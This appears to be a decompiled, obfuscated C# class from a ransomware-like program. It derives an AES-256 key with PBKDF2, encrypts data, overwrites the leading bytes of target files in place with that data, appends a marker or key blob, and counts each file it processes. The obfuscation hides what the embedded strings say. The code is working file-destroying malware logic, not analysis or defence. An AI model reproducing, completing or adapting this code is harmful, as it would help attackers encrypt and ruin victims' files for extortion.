using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bfaErnBXmrcm;

public static class VGJWYJmeCVBitpENl
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] lihSVqsjLmaIL(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = fTswtqbVYz(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes fTswtqbVYz(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] yOPIOqEGfFA(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (XPQlliQqqoVcs.SFvPyYNitxUPdY == getString_0(107396898))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (XPQlliQqqoVcs.bAnlYHNizndgL)
			{
				try
				{
					File.AppendAllText(XPQlliQqqoVcs.aaZyWKMhTXz, getString_0(107357279) + string_0 + getString_0(107367853) + ex.Message + getString_0(107396686));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void LLzjiaTjHpBC(string FATElJTDvXrO, byte[] xkhhCKobZdOkee, byte[] JydgHVrgUuI = null)
	{
		try
		{
			byte[] array = null;
			if (XPQlliQqqoVcs.SFvPyYNitxUPdY == getString_0(107396898))
			{
				array = (XPQlliQqqoVcs.OrDuxLunWVFQC ? Encoding.ASCII.GetBytes(XPQlliQqqoVcs.YkwwbzenLBYfa(XPQlliQqqoVcs.dNEZtehGQVTE) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367795)) + Convert.ToString(XPQlliQqqoVcs.RhyWxgbvizwSKf) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367795))) : Encoding.ASCII.GetBytes(XPQlliQqqoVcs.YkwwbzenLBYfa(XPQlliQqqoVcs.dNEZtehGQVTE) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367772)) + Convert.ToString(XPQlliQqqoVcs.RhyWxgbvizwSKf) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367772))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(FATElJTDvXrO, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(xkhhCKobZdOkee, 0, xkhhCKobZdOkee.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(FATElJTDvXrO, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!XPQlliQqqoVcs.OrDuxLunWVFQC)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(JydgHVrgUuI, 0, JydgHVrgUuI.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (XPQlliQqqoVcs.OrDuxLunWVFQC ? Encoding.ASCII.GetBytes(XPQlliQqqoVcs.YkwwbzenLBYfa(XPQlliQqqoVcs.dNEZtehGQVTE) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367795)) + Convert.ToString(XPQlliQqqoVcs.RhyWxgbvizwSKf) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367795))) : Encoding.ASCII.GetBytes(XPQlliQqqoVcs.YkwwbzenLBYfa(XPQlliQqqoVcs.dNEZtehGQVTE) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367772)) + Convert.ToString(XPQlliQqqoVcs.RhyWxgbvizwSKf) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367772))));
				FileStream fileStream2 = new FileStream(FATElJTDvXrO, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(xkhhCKobZdOkee, 0, xkhhCKobZdOkee.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(FATElJTDvXrO, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!XPQlliQqqoVcs.OrDuxLunWVFQC)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(JydgHVrgUuI, 0, JydgHVrgUuI.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			XPQlliQqqoVcs.QrtsFOhqWglXK++;
		}
		catch (Exception ex)
		{
			if (XPQlliQqqoVcs.bAnlYHNizndgL)
			{
				try
				{
					File.AppendAllText(XPQlliQqqoVcs.aaZyWKMhTXz, getString_0(107357279) + FATElJTDvXrO + getString_0(107367786) + ex.Message + getString_0(107396686));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (XPQlliQqqoVcs.OrDuxLunWVFQC ? Encoding.ASCII.GetBytes(XPQlliQqqoVcs.YkwwbzenLBYfa(XPQlliQqqoVcs.dNEZtehGQVTE) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367795)) + Convert.ToString(XPQlliQqqoVcs.RhyWxgbvizwSKf) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367795))) : Encoding.ASCII.GetBytes(XPQlliQqqoVcs.YkwwbzenLBYfa(XPQlliQqqoVcs.dNEZtehGQVTE) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367772)) + Convert.ToString(XPQlliQqqoVcs.RhyWxgbvizwSKf) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367772))));
			FileStream fileStream4 = new FileStream(FATElJTDvXrO, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(xkhhCKobZdOkee, 0, xkhhCKobZdOkee.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(FATElJTDvXrO, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!XPQlliQqqoVcs.OrDuxLunWVFQC)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(JydgHVrgUuI, 0, JydgHVrgUuI.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static VGJWYJmeCVBitpENl()
	{
		Strings.CreateGetStringDelegate(typeof(VGJWYJmeCVBitpENl));
	}
}
